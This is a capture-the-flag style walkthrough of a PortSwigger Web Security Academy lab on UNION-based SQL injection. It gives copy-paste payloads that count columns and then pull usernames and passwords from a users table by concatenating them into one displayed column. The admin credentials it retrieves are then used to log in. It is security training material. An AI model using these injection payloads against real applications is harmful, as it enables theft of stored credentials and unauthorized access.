<img width="700" height="350" alt="Screenshot_19" src="https://github.com/user-attachments/assets/9054f57b-137c-4de4-812f-281aa183d756" />

# 08 - Lab: SQL injection UNION attack — Retrieving multiple values in a single column

🔗 **Lab link**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

---

## 📝 Lab goal
Use a `UNION`-based SQL injection to retrieve **both username and password** even though the application only displays **one** text column. The trick is to match column counts/types and concatenate values into that single text column.

---

## ✅ Solution (copy-paste payloads & steps)

### 1) Find the number of columns
```sql
' UNION SELECT NULL,NULL--
```
### 2) Test type-compatibility / extract one column
If username and password produce a type error when returned directly, keep NULL in columns that must preserve their original types and put a text column in the displayable position:
- ' UNION SELECT NULL, password FROM users--
### 3) Concatenate username and password into the single text column
Use the DB concatenation operator the lab uses (Oracle: ||, MySQL/Postgres: CONCAT() or username||'~'||password depending on DB). In this lab the double-pipe operator works:
- ' UNION SELECT NULL, username||'~'||password FROM users--
### 4) Use retrieved admin creds
Copy the admin username and password from the concatenated results and log in via the app’s login page to complete the lab.
